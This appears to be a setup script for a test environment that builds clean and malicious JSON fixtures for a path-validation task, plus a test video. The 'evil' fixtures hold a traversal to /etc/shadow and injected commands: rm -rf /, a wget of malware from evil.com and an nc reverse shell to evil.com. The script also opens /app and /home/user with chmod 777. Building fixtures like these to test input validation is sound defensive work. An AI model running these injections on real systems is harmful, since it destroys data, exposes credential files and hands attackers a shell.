#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip rustc cargo ffmpeg jq wget netcat-openbsd
pip3 install pytest

mkdir -p /app/corpora/clean
mkdir -p /app/corpora/evil

# Clean payloads
cat << 'EOF' > /app/corpora/clean/payload1.json
{"device_id": "cam-1", "target_path": "/var/log/cam1", "sync_interval": 30}
EOF
cat << 'EOF' > /app/corpora/clean/payload2.json
{"device_id": "cam-2", "target_path": "/usr/local/data", "sync_interval": 120}
EOF

# Evil payloads
cat << 'EOF' > /app/corpora/evil/payload1.json
{"device_id": "cam-1", "target_path": "/var/log/cam1/../../../etc/shadow", "sync_interval": 30}
EOF
cat << 'EOF' > /app/corpora/evil/payload2.json
{"device_id": "cam-2", "target_path": "/var/log/$(rm -rf /)", "sync_interval": 60}
EOF
cat << 'EOF' > /app/corpora/evil/payload3.json
{"device_id": "cam-3", "target_path": "/var/log/`wget http://evil.com/malware`", "sync_interval": 60}
EOF
cat << 'EOF' > /app/corpora/evil/payload4.json
{"device_id": "cam-4", "target_path": "/var/log/data && nc -e /bin/sh evil.com 4444", "sync_interval": 60}
EOF

# Video fixture
ffmpeg -y -f lavfi -i testsrc=duration=5:size=320x240:rate=30 \
  -vf "geq=r='if(eq(N,42)+eq(N,43)+eq(N,44)+eq(N,89),0,p(X,Y))':g='if(eq(N,42)+eq(N,43)+eq(N,44)+eq(N,89),0,p(X,Y))':b='if(eq(N,42)+eq(N,43)+eq(N,44)+eq(N,89),0,p(X,Y))'" \
  -c:v libx264 -pix_fmt yuv420p /app/signal_test.mp4

chmod -R 777 /app

useradd -m -s /bin/bash user || true
chmod -R 777 /home/user
